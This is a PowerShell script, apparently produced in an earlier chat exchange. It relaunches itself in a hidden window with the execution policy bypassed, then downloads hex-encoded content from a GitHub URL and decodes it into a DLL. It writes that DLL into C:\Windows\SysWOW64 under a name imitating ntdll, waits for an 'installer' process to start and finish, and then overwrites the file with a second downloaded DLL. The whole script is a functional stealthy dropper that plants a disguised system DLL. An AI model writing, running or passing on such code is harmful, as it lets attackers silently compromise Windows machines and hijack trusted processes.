# Check if the script is already running in the background
if (-not $env:PS_RUN_BACKGROUND) {
    # Set an environment variable and start a new hidden PowerShell process
    $env:PS_RUN_BACKGROUND = 1
    Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-ExecutionPolicy", "Bypass", "-File", $MyInvocation.MyCommand.Path -NoNewWindow
    exit # Exit the original instance
}

# --- Your main script logic starts here ---
# (Use the final script content from the previous answer)
$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"

function HexToBytes {
    param([string]$hexStr)
    $hexStr = $hexStr.Trim()
    $hexStr = $hexStr -replace '\s', ''
    $byteArr = [byte[]]::new($hexStr.Length / 2)
    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing
    if ($responseA.StatusCode -eq 200) {
        $hexContent = $responseA.Content.Trim()
        $hexContent = $hexContent -replace '\s', ''
        if ($hexContent -and $hexContent.Length % 2 -eq 0) {
            $bytes = HexToBytes $hexContent
            [IO.File]::WriteAllBytes($filePath, $bytes)
            $writtenBytes = [IO.File]::ReadAllBytes($filePath)
            if ([System.Linq.Enumerable]::SequenceEqual($bytes, $writtenBytes)) {
            } else {
                exit 1
            }
        }
    }
} catch {
    exit 1
}

do {
    Start-Sleep -Milliseconds 500
} while (-not (Get-Process -Name "installer" -ErrorAction SilentlyContinue))

do {
    Start-Sleep -Milliseconds 500
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)

try {
    Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
} catch {
    exit 1
}
